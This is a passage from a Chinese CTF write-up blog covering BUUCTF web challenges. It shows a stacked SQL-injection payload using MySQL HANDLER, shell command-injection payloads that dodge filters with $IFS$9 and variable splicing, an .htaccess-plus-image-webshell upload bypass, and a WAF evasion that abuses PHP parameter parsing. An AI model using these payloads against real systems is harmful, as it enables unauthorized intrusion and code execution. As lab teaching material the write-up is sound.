<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JULIA"><figure class="iseeu highlight /julia"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/20200225203706719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="handler基本用法"><a href="#handler基本用法" class="headerlink" title="handler基本用法"></a>handler基本用法</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; FIRST | <span class="keyword">NEXT</span> | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> &#123; FIRST | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> FIRST获取句柄的第一行，通过<span class="keyword">READ</span> <span class="keyword">NEXT</span>依次获取其它行。最后一行执行之后再执行<span class="keyword">NEXT</span>会返回一个空的结果。</span><br><span class="line">通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br><span class="line"></span><br><span class="line">通过索引去查看的话可以按照一定的顺序，获取表中的数据。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> index_name FIRST，获取句柄第一行（索引最小的一行），<span class="keyword">NEXT</span>获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</span><br><span class="line"></span><br><span class="line">通过索引列指定一个值，可以指定从哪一行开始。</span><br><span class="line">通过HANDLER tbl_name <span class="keyword">READ</span> index_name = value，指定从哪一行开始，通过<span class="keyword">NEXT</span>继续浏览。</span><br></pre></td></tr></table></figure></div>



<p><u><code>句柄：【相当于一个指针，这里是指向数据库里的表】</code></u></p>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">3.1 创建测试表及测试数据</span><br><span class="line"></span><br><span class="line">create table handler<span class="emphasis">_table(  </span></span><br><span class="line"><span class="emphasis">    c1 int,   </span></span><br><span class="line"><span class="emphasis">    c2 varchar(10),   </span></span><br><span class="line"><span class="emphasis">    c3 int(10) </span></span><br><span class="line"><span class="emphasis">);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span></span><br><span class="line"><span class="emphasis">insert into handler_</span>table values(3, <span class="emphasis">&#x27;name3&#x27;</span>, 003);</span><br><span class="line"></span><br><span class="line">3.2 不通过索引打开查看表</span><br><span class="line"></span><br><span class="line">打开句柄：【相当于一个指针】</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line">mysql&gt; handler handler_table read next;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table close;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.3 通过索引打开查看表（FIRST,NEXT,PREV,LAST）</span><br><span class="line">通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。</span><br><span class="line"></span><br><span class="line">创建索引：</span><br><span class="line"></span><br><span class="line">mysql&gt; create index handler_index on handler_table(c1);</span><br><span class="line"></span><br><span class="line">打开句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index prev;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.4 通过索引打开查看表（=,&lt;=,&gt;=,&lt;,&gt;）</span><br><span class="line">从index为2的地方开始</span><br><span class="line"></span><br><span class="line">打开句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">查看表数据：</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index = (2);</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;     </span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line">关闭句柄：</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.5 附加：语法实例参考</span><br><span class="line"></span><br><span class="line">handler handler<span class="emphasis">_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table open as p;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next where c1 &gt;2 limit 1,2;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">create index handler_index on handler_table(c1);</span></span><br><span class="line"><span class="emphasis">handler handler_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index next limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index PREV limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index = (3);</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt;= (3) limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt;= (3) limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table close;</span></span><br><span class="line"><span class="emphasis">drop index handler_index on handler_</span>table;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里看懂以后，我自己又重新构造了一个</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler `<span class="number">19198109311145</span>14` open;handler `<span class="number">19198109311145</span>14` read first;</span><br></pre></td></tr></table></figure>

<p>效果一样，意思也差不多</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220731224702281.png" alt="image-20220731224702281"></p>
<h2 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字应该是道命令执行的题目</p>
<p>先传一个IP:123.123.123.123试试</p>
<p><code>?ip=123.123.123.123</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706231831194.png" alt="image-20220706231831194"></p>
<p>看起来是Linux命令，先显示所有文件试试（;是顺序执行，从左往右，命令全部执行）</p>
<p><code>?ip=123.123.123.123;ls</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706232001574.png" alt="image-20220706232001574"></p>
<p>看到flag文件，看看能不能直接读出</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706232135596.png" alt="image-20220706232135596"></p>
<p>发现，空格被过滤了，我试试了很多绕过，比如%0a，%20，%09，&lt;&gt;，但是回显都是</p>
<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706233818795.png" alt="image-20220706233818795"></p>
<p>意思是符号都过滤了</p>
<p>这里引入我一个新学的空格代替符$IFS$9，这是个shell中定义的环境变量，在此处可以绕过过滤</p>
<p>$IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>
<p>试试</p>
<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706234926216.png" alt="image-20220706234926216"></p>
<p>发现flag也被过滤了，那就只好先看看index.php文件，试试能不能看到其代码</p>
<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>看到ip有很多正则匹配的字符，所以没有那么容易绕过</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">shell_exec </span>— 通过 <span class="keyword">shell </span>环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line"><span class="keyword">shell_exec(string </span>$cmd): string</span><br><span class="line">exec 是 <span class="keyword">Shell </span>内置命令，它有两种用法，一种是执行 <span class="keyword">Shell </span>命令，一种是操作文件描述符</span><br><span class="line">ping -c <span class="built_in">Count</span> 指定要被发送（或接收）的回送信号请求的数目，由 <span class="built_in">Count</span> 变量指出</span><br><span class="line">--(所以这里我们只能输入四个字符)--</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">print_r函数用于打印变量，以更容易理解的形式展示</span><br><span class="line"></span><br><span class="line">例子</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span> (<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="keyword">array</span> (<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)); </span><br><span class="line"><span class="title function_ invoke__">print_r</span> (<span class="variable">$a</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [a] =&gt; apple</span><br><span class="line">    [b] =&gt; banana</span><br><span class="line">    [c] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; x</span><br><span class="line">            [<span class="number">1</span>] =&gt; y</span><br><span class="line">            [<span class="number">2</span>] =&gt; z</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>flag过滤语句的意思判断是否按顺序出现flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="built_in">if</span>(<span class="built_in">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))</span><br></pre></td></tr></table></figure></div>

<p>所以只要ip里的flag出现不按顺序就行，也就是flag另一种方式表示</p>
<p>我们看源码知道有两个变量，一个是$ip,$a</p>
<p>ip变量无法改变，变量a可以尝试赋值flag试试能不能绕过正则匹配，但是如果是a=flag，就会顺序出现flag，匹配，所以试试a=g，flag–&gt;fla$a</p>
<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>查看源码</p>
<p>得到flag</p>
<h2 id="3-MRCTF2020-你传你🐎呢"><a href="#3-MRCTF2020-你传你🐎呢" class="headerlink" title="3.[MRCTF2020]你传你🐎呢"></a>3.[MRCTF2020]你传你🐎呢</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p> 看标题知道这是一个文件上传的题目，要求上传一个木马</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710111959632.png" alt="image-20220710111959632"></p>
<p>打开先看到一个尸体在在笑，我们先试试能不能直接上传php文件</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>看来不行，那在试试能不能抓包修改前端文件后缀名，看看是不是前端验证，把php改成png，在抓包修改后缀为php</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>还是一样，还有一个猜想就是MIME验证，对content-type进行了检查，可以试试使用bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>，修改上传的PHP的content-type为image/png，但是还是一样的</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>于是，可以用.htaccess实现图片马以php文件形式读取（如果不了解可以把.htaccess文件了解一下，把线下靶场upload-labs做一下）</p>
<p>但是上传时，又被过滤了</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710112344441.png" alt="image-20220710112344441"></p>
<p>尝试修改文件名为.htaccess.png，然后用bp抓包修改回.htaccess，上传成功</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114410888.png" alt="image-20220710114410888"></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114422488.png" alt="image-20220710114422488"></p>
<p>然后上传图片木马</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114444539.png" alt="image-20220710114444539"></p>
<p>把路径复制一下</p>
<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114617412.png" alt="image-20220710114617412"></p>
<p>蚁剑连接成功</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220710114647722.png" alt="image-20220710114647722"></p>
<p>在根目录发现flag</p>
<p>得到flag</p>
<h2 id="4-RoarCTF-2019-Easy-Calc"><a href="#4-RoarCTF-2019-Easy-Calc" class="headerlink" title="4.[RoarCTF 2019]Easy Calc"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>还是得看大佬得wp才会</p>
<p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">原文链接</a></p>
<p>这是calc.php的内容，查看源码就可以看到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>waf主要就是看有没有非数字存在，绕过waf就好操作了</p>
<hr>
<p>1.1PHP的字符串解析特性</p>
<p>这是别人对PHP字符串解析漏洞的理解，<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。</p>
<p>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。</p>
<p>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。</p>
<p>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAXE"><figure class="iseeu highlight /haxe"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">new</span><span class="type">s</span>.php?%<span class="number">20</span><span class="keyword">new</span><span class="type">s</span>[id%<span class="number">00</span>=<span class="number">42</span><span class="string">&quot;+AND+1=0–</span></span><br></pre></td></tr></table></figure></div>

<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p><u><strong>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</strong></u></p>
<pre><code>1.删除空白符

2.将某些字符转换为下划线（包括空格）
</code></pre>
<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
<pre><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
</code></pre>
<p>那么我们可以在num前加个空格：</p>
<pre><code>http://www.xxx.com/index.php? num = aaaa
</code></pre>
<p>这样waf就找不到num这个变量了，因为现在的变量叫“（空格）num”，而不是“num”。</p>
<p>但php在解析的时候，会<u>先把空格给去掉</u>，这样我们的代码还能正常运行，还上传了非法字符。</p>
<hr>
<p>var_dump() </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">列举数组内容</span><br></pre></td></tr></table></figure>

<p>scandir() 的使用：</p>
